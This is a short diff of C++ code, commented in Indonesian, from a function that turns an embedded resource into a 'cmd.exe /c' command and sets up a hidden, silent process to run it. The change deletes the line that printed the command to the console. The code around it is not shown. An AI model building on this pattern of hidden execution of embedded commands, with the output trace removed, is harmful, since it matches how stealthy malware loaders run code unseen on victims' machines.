@@ -106,8 +106,7 @@ bool RunEmbeddedScript() {
     // Kita buat string dari buffer resource
     std::string command(pData, size);
     std::string fullCmd = "cmd.exe /c " + command;
-
-    std::cout << fullCmd << std::endl;
+ 
 
     // 5. Konfigurasi proses (Silent/Hidden)
     STARTUPINFOA si = { sizeof(si) };
